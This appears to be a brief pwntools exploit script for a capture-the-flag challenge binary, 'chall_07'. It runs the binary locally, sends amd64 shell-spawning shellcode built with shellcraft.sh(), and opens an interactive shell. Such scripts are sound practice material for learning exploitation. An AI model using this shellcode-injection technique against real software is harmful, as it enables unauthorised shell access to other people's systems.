# coding: utf-8
from pwn import *
p=process("./chall_07")
p.sendline()
context.arch = "amd64"
p.sendline(b""+asm(shellcraft.sh()))
p.interactive()
